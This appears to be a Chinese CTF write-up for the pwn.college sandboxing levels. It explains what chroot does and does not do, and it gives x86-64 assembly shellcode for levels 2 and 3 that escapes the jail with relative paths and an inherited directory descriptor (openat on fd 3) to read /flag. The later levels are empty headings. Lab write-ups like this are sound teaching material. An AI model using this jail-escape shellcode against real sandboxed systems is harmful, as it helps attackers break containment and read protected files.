---
title: PWN-College-SandBox-Writeup
date: 2024-09-14 10:46:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - Web
---
# pwn.college

https://pwn.college/system-security/sandboxing/

## 有价值的问题

###

###


## level 1

如果在根目录下面执行的话，直接`/challenge/babay flag`即可

`chroot()` changes the meaning of `/` for a process and its children.

`chroot("/tmp/jail")` has two effects:
 - For this process, change the meaning of "/" to mean "/tmp/jail".
    - and everything under that: "/flag" becomes "/tmp/jail/flag"
 - For this process, change "/tmp/jail/.." to go to "tmp/jail"

`chroot("/tmp/jail")` does NOT:
- Close resources that reside outside of the jail.
- `cd(chdir())` into the jail.
- Do anything else ！
- Neither of the effects of `chroot` do anything to previously-open resources.
- change hte current working directory



## level 2

`/challenge/babyjail_level2 ./test < ./shellcode.bin`

```asm
BITS 64

section .data
    filename db '../../../../flag', 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start

_start:
    ; open("filename", O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY = 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall
```

## level 3

注意`open`函数打开的，既有可能是一个文件，也有可能是一个目录。

`/challenge/babyjail_level3 ./ < ./shellcode.bin`

```asm
BITS 64

section .data
    filename db '../../../../flag', 0    ; 文件路径需要替换为正确的路径
    errormessage db 'error', 0

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start

_start:
    ; openat(3, filename, 0, 0)
    xor rdi, rdi
    xor rax, rax
    xor r10, r10
    mov rdi, 3
    xor rdx, rdx
    mov rax, 0x101                    ; SYS_openat
    lea rsi, [rel filename]
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; write(1, buffer, rax)
    lea rsi, [rel errormessage]
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall


    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall


```

## level 4


## level 5


## level 6



## level 7
